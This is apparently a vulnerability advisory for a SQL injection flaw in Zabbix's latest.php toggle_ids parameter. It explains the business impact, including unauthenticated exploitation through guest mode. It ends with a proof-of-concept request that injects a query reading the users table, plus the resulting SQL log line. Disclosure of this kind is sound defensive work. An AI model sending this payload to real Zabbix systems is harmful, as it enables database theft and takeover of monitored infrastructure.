Vendor Description:
=====================
Zabbix is an open source availability and performance monitoring solution.


Vulnerability Overview:
=====================
Zabbix 2.2.x, 3.0.x and trunk suffers from a remote SQL injection vulnerability due to a failure to sanitize input in the toggle_ids array in the latest.php page.


Business Impact:
=====================
By exploiting this SQL injection vulnerability, an authenticated attacker (or guest user) is able to gain full access to the database. This would allow an attacker to escalate their privileges to a power user, compromise the database, or execute commands on the underlying database operating system.

Because of the functionalities Zabbix offers, an attacker with admin privileges (depending on the configuration) can execute arbitrary OS commands on the configured Zabbix hosts and server. This results in a severe impact to the monitored infrastructure.

Although the attacker needs to be authenticated in general, the system could also be at risk if the adversary has no user account. Zabbix offers a guest mode which provides a low privileged default account for users without password. If this guest mode is enabled, the SQL injection vulnerability can be exploited unauthenticated.


Proof of Concept:
=====================

latest.php?output=ajax&sid=&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385); select * from users where (1=1

Result:
SQL (0.000361): INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (88, 1, 'web.latest.toggle', '1', 2, 15385); select * from users where (1=1)
